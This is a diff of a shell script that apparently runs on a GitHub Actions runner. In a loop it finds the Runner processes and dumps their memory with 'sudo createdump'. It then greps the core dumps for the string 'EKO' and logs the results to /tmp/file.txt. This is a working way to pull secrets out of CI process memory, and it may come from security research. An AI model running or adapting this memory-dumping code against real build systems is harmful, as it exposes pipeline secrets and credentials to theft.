@@ -15,18 +15,14 @@ echo "file" >> /tmp/file.txt
 file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
 echo $(chmod +rwx /home/runner/runners/2.284.0/bin/createdump -v) >> /tmp/file.txt
 
-echo "va" >> /tmp/file.txt
-echo $(. /home/runner/runners/2.284.0/bin/createdump -h) >> /tmp/file.txt
-
-echo $(hostnamectl) >> /tmp/file.txt
-
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
     echo "---$pid---" >> /tmp/file.txt;
     echo $(pwdx $pid) >> /tmp/file.txt;
     echo "sudo /home/runner/runners/2.284.0/bin/createdump -n $pid" >> /tmp/file.txt;
     echo $(sudo /home/runner/runners/2.284.0/bin/createdump -n $pid) >> /tmp/file.txt;
-    echo "cat /tmp/coredump.$pid -| grep EKO" >> /tmp/file.txt;
+    echo "cat /tmp/coredump.$pid | grep EKO" >> /tmp/file.txt;
+    file /tmp/coredump.$pid >> /tmp/file.txt;
     echo $(cat /tmp/coredump.$pid | grep EKO) >> /tmp/file.txt;
 done
 
